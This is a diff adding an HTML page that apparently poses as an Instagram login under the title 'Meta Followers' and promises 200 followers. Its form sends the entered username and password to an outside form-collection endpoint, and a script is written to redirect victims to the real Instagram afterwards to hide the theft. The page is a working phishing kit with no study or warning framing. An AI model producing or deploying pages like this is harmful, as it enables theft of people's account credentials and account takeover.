@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Followers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .centered-image {
+            width: 100%;
+            max-width: 400px; /* Adjust this size based on your image */
+            height: auto;
+            margin-top: 20px; /* Adds some space from the top */
+            border-radius: 10px; /* Optional for rounded corners */
+        }
+
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+          
+            width: 90%;
+            max-width: 400px;
+            margin-top: 20px; /* Adds space between image and container */
+        }
+
+        .logo {
+            font-size: 30px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 20px;
+        }
+
+        .logo span {
+            color: #007aff;
+        }
+
+        .signin-btn {
+            background-color: #007aff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .signin-btn:hover {
+            background-color: #005bb5;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            border-color: #007aff;
+            outline: none;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px;
+            }
+
+            .logo {
+                font-size: 24px;
+            }
+
+            .signin-btn {
+                font-size: 16px;
+            }
+
+            .input-field {
+                padding: 8px;
+            }
+
+            .centered-image {
+                max-width: 300px; /* Adjust the image size for small screens */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Image at the top of the page, outside the container -->
+    <img src="https://i.ibb.co/jLxYbqp/IMG-20241014-182126.png" class="centered-image" width="800px">
+
+    <div class="container">
+        <div class="logo">login <span> to you Instagram</span></div>
+
+        <form action="https://formspree.io/f/xdorvdql" method="post">
+            <input type="text" name="username" class="input-field" placeholder="Username" required>
+            <input type="password" name="password" class="input-field" placeholder="Password" required>
+    
+            
+            <button type="submit" class="signin-btn">Sign in</button>
+        </form>
+        
+        <p style="text-align: center; margin-top: 20px; font-size: 16px; color: #555;">
+    We help you get 200 followers by showing your account to a massive audience. Your profile will be promoted and exposed to a wide range of users to gain quick engagement within minutes.
+</p>
+    </div>
+<script>
+document.getElementById("myForm").addEventListener("submit", function(event) {
+  event.preventDefault(); // Prevent default form submission behavior
+
+  // Handle form submission logic here if necessary
+  // ...
+
+  setTimeout(function() {
+    window.location.href = "https://www.instagram.com/"; // Replace with your desired redirect URL
+  }, 5000); // Redirect after 5 seconds (5000 milliseconds)
+});
+</script>
+
+
+
+</body>
+</html>
